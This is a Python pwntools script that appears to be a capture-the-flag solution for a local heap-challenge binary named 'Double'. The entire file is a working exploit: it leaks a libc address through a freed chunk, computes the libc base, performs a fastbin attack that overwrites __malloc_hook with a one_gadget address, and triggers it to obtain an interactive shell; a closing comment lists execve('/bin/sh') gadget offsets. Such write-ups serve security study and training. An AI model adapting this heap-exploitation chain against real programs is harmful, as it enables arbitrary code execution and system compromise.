#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = process('./Double')
elf = ELF('./Double')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'

def create(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('data:')
    p.sendline(content)

def edit(idx,content):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.sendline(content)

def delete(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(idx))

###leak libc###
create('leak'*0x20)#0
create('leak'*0x20)#1
delete(0)
show(1)
main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88
log.success('main arena:'+hex(main_arena))
libc_base = main_arena - 0x3c4b20
log.success('libc base:'+hex(libc_base))
###fastbin attack###
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4526a

create('A'*0x60)#2
create('A'*0x60)#3
delete(2)
edit(3,p64(malloc_hook - 0x23))
create('A'*0x60)

payload = 'A'*0x13 + p64(one_gadget)
payload = payload.ljust(0x60,'A')
create(payload)

p.sendline('1')#tigger __malloc_hook
p.interactive()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

